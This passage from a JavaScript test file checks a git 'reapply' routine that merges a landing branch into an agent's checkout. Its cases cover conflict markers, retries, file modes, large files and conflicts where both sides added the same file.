      assert.equal(await readFile(out2, "utf8"), "keep\n");
    } finally { await w2.done(); }
  } finally { await w.done(); }
});

test("reapply plans every refusal before the first write: a directory at the last target changes no earlier file, and a retry is safe", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.shared, "doc.txt"), lines(20)); sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "doc");
    const start = await w.git.head(w.shared);
    const dir = join(w.dir, "c2"); const gd = join(w.dir, "t2.git");
    await w.git.createCheckout({ shared: w.shared, commit: start, gitDir: gd, checkout: dir });
    await writeFile(join(dir, "doc.txt"), lines(20, [5, "agent five"]));
    await mkdir(join(dir, "zlast.txt"));            // a directory where the landing branch adds a file
    await writeFile(join(dir, "zlast.txt", "x"), "x");
    const next = await advance(w, { "doc.txt": lines(20, [5, "landing five"]), "README.md": "moved\n", "zlast.txt": "file\n" });
    await refuses("invalid_path", () => w.git.reapply({ shared: w.shared, commit: next, gitDir: gd, checkout: dir }));
    assert.equal(await readFile(join(dir, "doc.txt"), "utf8"), lines(20, [5, "agent five"]), "no earlier file was merged");
    assert.equal(await readFile(join(dir, "README.md"), "utf8"), "hello\n");
    assert.equal(await w.git.head(w.shared), next);
    // Remove the obstacle and retry: the merge happens once.
    await rm(join(dir, "zlast.txt"), { recursive: true });
    const r = await w.git.reapply({ shared: w.shared, commit: next, gitDir: gd, checkout: dir });
    assert.deepEqual(r.conflicts, [{ path: "doc.txt", kind: "overlap" }]);
    const once = await readFile(join(dir, "doc.txt"), "utf8");
    assert.equal(once.split("<<<<<<< mine").length - 1, 1);
  } finally { await w.done(); }
});

test("reapply does not merge a file again that already holds its markers for the same landing commit", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.shared, "doc.txt"), lines(20)); sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "doc");
    const start = await w.git.head(w.shared);
    const dir = join(w.dir, "c2"); const gd = join(w.dir, "t2.git");
    await w.git.createCheckout({ shared: w.shared, commit: start, gitDir: gd, checkout: dir });
    await writeFile(join(dir, "doc.txt"), lines(20, [5, "agent five"]));
    const next = await advance(w, { "doc.txt": lines(20, [5, "landing five"]) });
    await w.git.reapply({ shared: w.shared, commit: next, gitDir: gd, checkout: dir });
    const first = await readFile(join(dir, "doc.txt"), "utf8");
    // Simulate a failure after the file was written: the base has not moved.
    sh(dir, "--version");
    execFileSync("git", ["--git-dir", gd, "update-ref", "refs/nn/base", start]);
    const r = await w.git.reapply({ shared: w.shared, commit: next, gitDir: gd, checkout: dir });
    assert.deepEqual(r.conflicts, [{ path: "doc.txt", kind: "overlap" }]);
    assert.equal(await readFile(join(dir, "doc.txt"), "utf8"), first);
  } finally { await w.done(); }
});

test("reapply keeps the executable bit of a file taken from the landing branch, and counts a mode-only change as the agent's work", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.shared, "run.sh"), "#!/bin/sh\n"); await chmod(join(w.shared, "run.sh"), 0o755); sh(w.shared, "add", "-A"); sh(w.shared, "commit", "-q", "-m", "script");
    const next = await w.git.head(w.shared);
    await chmod(join(w.checkout, "README.md"), 0o755); // mode only
    const r = await w.git.reapply({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout });
    assert.deepEqual(r.taken, ["run.sh"]); assert.deepEqual(r.kept, ["README.md"]);
    assert.equal((await stat(join(w.checkout, "run.sh"))).mode & 0o111, 0o111);
    const s = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
    assert.ok(!s.files.some((f) => f.path === "run.sh"), "the landing file is not the agent's work");
    assert.equal((await stat(join(w.checkout, "run.sh"))).mode & 0o111, 0o111);
    assert.equal((await stat(join(w.checkout, "README.md"))).mode & 0o111, 0o111, "the agent's mode change survives");
  } finally { await w.done(); }
});

test("reapply streams taken files: a landing file over the size cap that the agent never touched does not block the refresh", { skip }, async () => {
  const w = await world();
  try {
    const big = Buffer.alloc(8 * 1024 * 1024 + 10, 97);
    const next = await advance(w, { "big.txt": big.toString("latin1") });
    const r = await w.git.reapply({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout });
    assert.deepEqual(r.taken, ["big.txt"]);
    assert.equal((await stat(join(w.checkout, "big.txt"))).size, big.length);
  } finally { await w.done(); }
});

test("reapply: a file added on both sides with different content keeps the agent's side with no markers; the same head does not reset the agent's commits", { skip }, async () => {
  const w = await world();
  try {
    await writeFile(join(w.checkout, "both.txt"), "mine\n");
    const next = await advance(w, { "both.txt": "theirs\n" });
    const r = await w.git.reapply({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout });
    assert.deepEqual(r.conflicts, [{ path: "both.txt", kind: "both-added" }]);
    assert.equal(await readFile(join(w.checkout, "both.txt"), "utf8"), "mine\n");
    // An own commit that is not recorded stays when the head has not moved.
    await writeFile(join(w.checkout, "work.txt"), "w\n");
    const s = await w.git.stage({ gitDir: w.gitDir, checkout: w.checkout });
    await w.git.commit({ gitDir: w.gitDir, checkout: w.checkout, permit: { base: s.base, tree: s.tree, filesDigest: filesDigest(s.files), message: "m", author: { name: "a", email: "a@x.invalid" }, committer: { name: "n", email: "n@x.invalid" }, trailers: [] } });
    const headBefore = execFileSync("git", ["--git-dir", w.gitDir, "rev-parse", "HEAD"], { encoding: "utf8" }).trim();
    assert.notEqual(headBefore, next);
    const again = await w.git.reapply({ shared: w.shared, commit: next, gitDir: w.gitDir, checkout: w.checkout });
    assert.equal(again.unchanged, true);
    assert.equal(execFileSync("git", ["--git-dir", w.gitDir, "rev-parse", "HEAD"], { encoding: "utf8" }).trim(), headBefore);
  } finally { await w.done(); }
});
